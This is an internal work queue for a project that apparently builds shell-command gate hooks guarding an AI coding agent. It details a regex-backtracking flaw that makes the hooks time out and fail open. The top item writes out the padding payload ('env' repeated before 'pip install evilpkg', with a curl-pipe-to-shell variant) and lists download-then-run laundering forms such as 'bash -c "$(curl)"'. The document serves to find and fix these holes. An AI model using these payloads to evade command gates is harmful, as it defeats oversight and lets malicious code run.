# Readiness queue

Worked by `.claude/readiness-runbook.md`. **Internal automation, not protocol
surface.** Ordered by the runbook's §1 rule: **A before B before C — never take
a C item while an A item is ready.**

The goal is not "empty this list". It is to move `docs/production-readiness.md`
§1 off **"not production ready"**. Items are labelled with what they actually
buy.

---

## A — moves the verdict

*(`c1-license` closed 2026-08-14 — PR #75, merge `de13e71`. See Done.)*

- **[ready] sdk-pipe-trigger-redos** · `CODE` · eligible: **yes** · full ceremony
  · scope `lib/cmdpos.py`, `lib/sdk_gates_template.py`,
  `tests/test_substrate_differential.py`, `tests/test_composition.py`,
  `docs/deferred-backlog.md`
  **A LIVE FAIL-OPEN ON `main`, FOUND 2026-08-16 WHILE DESIGNING x37 ATTEMPT 2,
  AND UNRELATED TO X-37.** `_PIPE_TO_SHELL` in the emitted `gates.py` is built
  from `cmdpos.prefix_run()`, whose nested `(...)*` quantifiers backtrack
  **exponentially** on a FAILING match — measured at exactly **2.00x per added
  prefix token**. Payload `curl http://e/i.sh | ` + `"env " x n` +
  `zzz ; pip install evilpkg`: n=16 1.27 s, n=18 4.88 s, n=20 19.43 s,
  **n=22 77.28 s at 134 BYTES with ZERO jump bytes** — past the emitted
  `dependency-gate` 60 s timeout declared in `_GATE_TIMEOUTS`. The emitted file
  states the consequence itself (X-51 correction, 2026-08-13): a hook cancelled
  at its timeout exits 124/137/143, only exit 2 blocks, **the call PROCEEDS**.
  So the `pip install evilpkg` riding in the same command is never adjudicated.
  **The SHELL denies the same string in 0.03 s and is flat** — bash's ERE engine
  does not backtrack — so this is shell-DENY / SDK-BYPASS, the
  SDK-more-permissive direction this pair forbids outright.
  **`_cost_guard` CANNOT SEE IT.** It measures LENGTH (`_CMD_MAXLEN` 81920) and
  DENSITY (`_CMD_MAXJUMP` 8191); this payload is 134 bytes with **zero** jump
  bytes. The axis is **TOKEN COUNT at fixed length** and nothing measures it.
  **BLAST RADIUS — THE FIRST STATEMENT OF IT WAS FALSE AND IS CORRECTED HERE
  RATHER THAN REWRITTEN.** This row and ledger entry 34 first said *"only
  `_PIPE_TO_SHELL` blows up; `_ANCHOR` and `_INSTALL_HEAD` are flat at n=24"*.
  **`_INSTALL_HEAD` is NOT flat.** What was timed was `cmdpos.install_head_tail()`
  — the TAIL BUILDER. The emitted object is a different thing:
  `_CMD_PFX_RE` (gates.py:79) is the prefix run, `_PREFIX = _CMD_PFX_RE` (:1775),
  and `_INSTALL_HEAD = re.compile(r"^\s*" + _PREFIX + _INSTALL_TAIL)` (:1801) —
  prefix run followed by a failable tail, i.e. the vulnerable shape. Measured on
  the emitted compiled objects, payload `"env " x n + "zzz"`:
  `_INSTALL_HEAD` 0.013 / 0.204 / 0.824 / 3.289 / 13.160 s and `_PIPE_TO_SHELL`
  0.016 / 0.254 / 1.016 / 4.116 / 16.405 s at n = 14 / 18 / 20 / 22 / 24.
  **THREE of the emitted objects carry the prefix run and ALL THREE blow up**,
  and `_ANCHOR` does not exist in the emitted module at all. The third is
  `_GIT_VERB_TMPL` (gates.py:1739), which splices `_CMD_PFX_RE` and is compiled
  per call as `pat = _GIT_VERB_TMPL % verb`; a scan for module-level COMPILED
  patterns cannot see a template compiled at call time, which is how the first
  two counts of this set were both wrong. Measured
  `_GIT_VERB_TMPL % "commit"` on `"env " x n + "zzz"`: 0.0064 / 0.1032 / 0.4135
  / 1.6492 / 6.6510 s at n = 14 / 18 / 20 / 22 / 24, the same base-2 shape.
  **`_git_verb` is the FIRST statement of spec-gate-commit, test-gate and
  eval-gate, so ONE 121-byte payload costs FOUR gates:** dependency-gate
  12.867 s, eval-gate 7.757 s, spec-gate-commit 7.805 s, test-gate 7.787 s.
  **AND THE COST IS NOT A COUNT — IT IS AN INTERLEAVING.** Measured end to end:
  1 wrapper + 800 assignments is 3207 B / 802 tokens / **0.20 s**, while
  6 wrappers x 16 assignments is 411 B / 103 tokens / **>95 s**. So no cap on
  length, bytes or token count separates benign from attack, and any fence must
  key on the parse/interleaving structure instead.
  **AND THE REACHABLE ATTACK IS SIMPLER THAN FIRST REPORTED — no downloader, no
  pipe, no substitution.** `"env " x n + "zzz ; pip install evilpkg"` end to end
  on the emitted gate: n=24 121 B 13.20 s, n=25 125 B 26.44 s, n=26 129 B
  51.62 s, **n=27 133 B 102.32 s** — 133 bytes of ordinary words, zero jump
  bytes, past the 60 s ceiling, with a genuine `pip install` deny never
  delivered. This makes the item MORE urgent, not less. `verify the artifact you
  measured` — logged again.
  **TWO OBVIOUS FIXES ARE ALREADY DEAD, BY MEASUREMENT — DO NOT RE-PROPOSE:**
  atomic-grouping the whole prefix run (`(?>...)`) kills the cost completely
  (0.0000 s at n=2000) but turns **17 of 29** live denies into ALLOWS, every one
  a trailing-argument form (`env python3 -m code`, `sudo sh -c 'x'`,
  `timeout 5 bash -c 'x'`); atomic-grouping only arm 1's inner positional run
  breaks **11 of 31**. A first, easier 31-row corpus reported the whole-run
  variant as clean — **the trailing-argument rows are what expose it**, so any
  candidate must be measured against the full 4,161-row differential, not a
  hand corpus.
  Step 4 = a differential/behaviour row red on the current tree, plus a COST row
  on the token-count axis measured on the emitted `gates.py`. Freeze exception
  applies (emitted body moves). **Never batched.**

- **[ready] x37-class-b** · `CODE` · eligible: **yes** · full ceremony
  · scope `lib/cmdpos.py`, `lib/templates.py`, `lib/sdk_gates_template.py`,
  `tests/test_substrate_differential.py`, `tests/test_composition.py`,
  `tests/test_greenfield_golden.py`, `tests/test_retrofit.py`,
  `docs/deferred-backlog.md`
  **ATTEMPT 1 BUILT AND WITHDRAWN 2026-08-14 — STILL OPEN. Read the X-37 row
  before re-planning; it carries what 100 agents proved.** Branch
  `fix/x37-class-b`, PR #77, NOT merged, kept as evidence. It made 54 rows go
  allow/allow → deny/deny with the fence intact and the suite at 25/9,739/0,
  and the step-7 review still killed it: the rule is ~cubic in
  substitution-opener count, a dimension `_cost_guard` does not bound, so a
  cap-legal `$(`-dense payload crosses the emitted 60 s timeout — and a killed
  hook fails OPEN, turning the approved-list and D20 denies into ALLOWS. A
  larger hole than the one it closed. Second blocker: the body scan `[^)]`
  cannot cross a `)`, so one nested `$()` before the downloader defeated all
  six arms. The two are in TENSION.
  **THE ROW'S OWN INSTRUCTION IS THE THING TO STOP FOLLOWING:** "model it
  beside `cmdpos.pipe_to_shell_regex`" is the wrong architecture. Attempt 2
  should use the walk that already exists — `_cs_subst_scan` / `_subst_inners`
  / `_lift_subs`, bounded by `_SUBST_BUDGET` / `_SUBST_MAXLEN` — to ask which
  substitutions carry a downloader at a command position, plus a CHEAP anchored
  test for whether the substitution sits at an execution position.
  **Scope is wider than this row said** (the four files above were missing, and
  `tests/test_retrofit.py`'s digests go red without it — a step-5 E4 waiting to
  happen). Freeze exception **71 is drafted but UNUSED**; attempt 2 reuses it.
  **Also carried:** `interpreter_word` not `INVOKERS` (or `${SHELL} -c "$(dl)"`
  matches nothing) · the code letter is admissible anywhere in a bundle
  (`bash -cx`) · `bash < <(dl)`, `bash <<< "$(dl)"`, `bash /dev/stdin <<<`,
  `bash 0< <(dl)` are the same channel and absent from this row's shape list ·
  `bash -c -- "$(dl)"` needs a `--`-tolerant run · `ssh host "$(dl)"` denies on
  the merits · **measure cost with `$(`-DENSE padding, not plain text** — plain
  padding is linear and hides this entire class.
  Item 1b / Class B: download-then-run laundered through a command
  substitution (`bash -c "$(curl)"`, `eval`, bare/backtick/process-sub).
  Status cell, derived 2026-08-14: `` `open` — pre-existing, forbidden
  direction, release-relevant; the distinct half of item 1``. §8 holds item 1
  release-blocking until 1b/X-37 **and** B3 land; **B3 has landed**
  (`lib/templates.py:1700`), so this is the survivor and the only A-tier item
  that can be taken without a decision.
  Step 4 = a differential row that is red on the current tree. Freeze
  exception applies. **Never batched.**

## B — makes shipping-with-known-risk honest

- **[ready] t1-honest-labelling** · `EMITTED` · eligible: **partial**
  · scope `lib/templates.py`, `lib/sdk_gates_template.py`, emitted
  `secrets.md`, `docs/changelog.md`
  Qualify the emitted `secrets.md` promise (timeout/padding bypass); sweep
  emitted templates for flat reassurances — joined-file, case-insensitive, over
  `git ls-files` **and** emitted bodies **and** `gh pr view --json body`.
  The sweep-and-qualify half is eligible; the emit-or-not question is split out
  below. Freeze exception + citation rule apply.

- **[ready] t1-threat-model-emit** · `EMITTED` · eligible: **yes**
  **DECIDED 2026-08-14 by the operator: EMIT it into installs.** Unblocked.
  This fulfils the disclosure half of defer-and-disclose. Costs a freeze
  exception and a golden re-baseline (action counts WILL move — a file is
  added, so §4.1's count check is expected to change here and that is not
  **E5**; say so in the exception). Sequence AFTER `t1-honest-labelling` so the
  emitted text is already honest when it ships.

- **[ready] dw-p4-posture** · `DOC` · eligible: **yes** · batchable with C
  **DECIDED 2026-08-14 by the operator: DW-P4 STAYS ADVISORY — write it down.**
  Record the decision and close the standing question. Two `DOC` follow-ons
  ride along: DW policy §1's grant table still names the inert
  `~/.claude/settings.json` under `CLAUDE_CONFIG_DIR` (re-confirmed
  2026-08-14), and the DW-P4 breach count is stale against the ledger. Note
  honestly that advisory means the logged breach can recur.

- **[blocked] a6-spec-gate-predicate** · `DECISION` · eligible: **no** · T0
  `spec-gate-commit`'s predicate blocks the first code commit of every adopting
  project. Tier it, size it, or close it — a decision, not a fix.

## C — record hygiene · moves the verdict **not at all**

**Batch these.** One branch, one PR, one review, one checkpoint. They are
separate items only because they were discovered separately.

- **[ready] x58-table-render** · `DOC` · scope `docs/deferred-backlog.md`
  Anchors drifted (header :333-334, blanks :360/:397). **Not mechanical** —
  deleting the blanks drops status cells from over-celled rows, which silently
  changes `count.py`'s answer. Validate the rule at 88 before *and* after.
- **[ready] priority-reading** · `DOC` · scope `docs/production-readiness.md`
  Names none of the twelve genuinely blocking rows; Snapshot header still
  `main @ 3c0a2de`, many merges stale.
- **[ready] x49-four-eras** · `DOC` · scope `docs/deferred-backlog.md`,
  `docs/changelog.md`
- **[ready] changelog-citation-anchor** · `TEST-CONTRACT` · **not batched**
  · scope `tests/test_doc_citations.py`, `.claude/dynamic-workflow-policy.md`
  Anchor the changelog citation to a heading instead of a line: it moved three
  times in one session (795 → 851 → 882 → 922; twelfth value, eleventh move).
  Step 4 needs a case proving the old form passed wrongly.

## Measurement residuals

- **[ready] x54-deny-shape** · `MEASUREMENT` · eligible: **yes**
  The gap the 2026-08-14 pass left in its own claim: same 80004 B / 4000 jumps
  padding, but a payload that **would otherwise DENY**, through the emitted
  60 s timeout. That *demonstrates* X-54's bypass rather than sizing it. The
  harness exists and takes `HC_HEADS`.
- **[ready] x55-rerun** · `MEASUREMENT` · eligible: **yes**
  `>240 s KILLED` not re-run; stated as owed in the KB.

## External — not ours to take

- **[blocked] sibling-lit07-migrations** · `EXTERNAL` · eligible: **no**
  AgenticRE and hermes-provisioning-refactor carry uncommitted LIT-07
  migrations. A reset there loses them silently. Surface at next contact.

## Residue — do not re-open

Changelog per-item entries for nos. 51–67 (absent by the entry's own words);
the nine historical fail-closed sites (historical record); the PR-attribution
defect (fixed, `fc37aaa`); the `count.py` rule (fixed).

## Done

**`b1b-fence-pins` PR #79 `88b2c42` — the item-1b false-positive fence, which
did not exist.** Every pinned row in the repo putting a command or process
substitution at an EXECUTION position was one of the six Class-B KNOWN-OPEN rows
X-37 exists to FLIP to `deny`; nothing asserted such a substitution may still be
ALLOWED, so a rule keyed on position alone was invisible to the corpus. 45 rows
in four behaviourally-derived groups (`_B1B_FENCE_EXEC` 26 / `_B1B_FENCE_PATH` 4
/ `_B1B_FENCE_DATA` 8 / `_B1B_FENCE_DL` 7) + 12 contract checks. Suite
9,672 -> 9,729; differential 4,104 -> 4,161. No `lib/` change, no rule, no
digest movement, **no freeze exception**. **X-37 is NOT advanced** — this makes
the next attempt falsifiable. Merged by the loop on explicit operator direction
in-session (9b carve-out; the operator was on remote control and could not
reach `gh`).

**`c1-license` PR #75 `de13e71` — readiness C-1 CLOSED, Apache-2.0; the first
finding this cycle FIXED rather than re-measured** · `x54-headclass-measurement`
PR #70 `9450b7d` (exc. 69) · `prd-filename-v280`
PR #72 `54ebc4b` (exc. 70) · ledger entries 27/28 PRs #69 `f9c2bb2`, #71
`03dd309` · post-v2.8.0 record PR #68 `6143427` · **the harness itself**
(runbook + this queue + `context-check.py`) PR #73 `358ac9b`, **merged by the
operator — the first merge in this run the loop did not perform itself**, which
is exactly what 9b now requires.

## Owed

*(Nothing. The PR #72 ledger entry that was owed here is discharged as entry
29; the harness work is entry 30. Ledger at 30, pin moved in the same commit.)*

**Verdict status, so the scoreboard is not lost between sessions:**
`docs/production-readiness.md` §1 still reads **NOT PRODUCTION READY** — and
that is the correct outcome, not a failure of the item. **C-1 is CLOSED** (PR
#75, `de13e71`): the first readiness finding this cycle to be *fixed* rather
than re-measured, and `git ls-files | grep -icE 'licen[cs]e'` now returns 1.
§1 rests on **three** negative legs and one is gone. Still standing:
**X-37** (Class B — a remote payload still runs) and **C-2** (the autonomous
wrappers dispatch nothing). *"C-1 alone settles it either way"* meant
independently sufficient, never sole ground.

**The next item is `sdk-pipe-trigger-redos`, not `x37-class-b`.** It is a LIVE
fail-open on `main` in the SDK-more-permissive direction, reachable in 134
bytes, and it outranks a hole that is `open` but static. `x37-class-b` stays
ready behind it and now has a fence under it (PR #79).

**On `x37-class-b`:** It is the only remaining A-tier
row, it is `CODE`, and it gets full ceremony. **Attempt 1 (2026-08-14) was
built, measured and WITHDRAWN as a net security regression — see the entry above
and the X-37 row. Nothing about the verdict changed, and X-37 is still `open`.**
The lesson the next session should not have to rediscover: a verdict corpus of
4,163 rows was fully green over a rule that was bypassable by one nested `$()`
and that turned existing denies into allows under padding. **A green corpus
proves the corpus did not move, not that the gate is sound** — the third time
this repo has logged that shape.
